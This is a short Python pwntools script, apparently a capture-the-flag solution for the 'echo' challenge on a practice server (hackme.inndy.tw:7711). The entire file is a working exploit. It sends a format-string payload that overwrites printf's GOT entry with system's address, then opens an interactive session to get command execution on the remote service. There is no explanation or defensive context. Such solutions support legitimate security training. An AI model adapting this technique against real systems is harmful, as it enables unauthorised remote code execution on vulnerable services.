#!/usr/bin/env python2

from pwn import *
import pwnlib.elf

e = ELF('./echo')
p = remote('hackme.inndy.tw', 7711)
p.sendline(fmtstr_payload(7, { e.got['printf'] : e.plt['system']}))

p.interactive()
p.close()
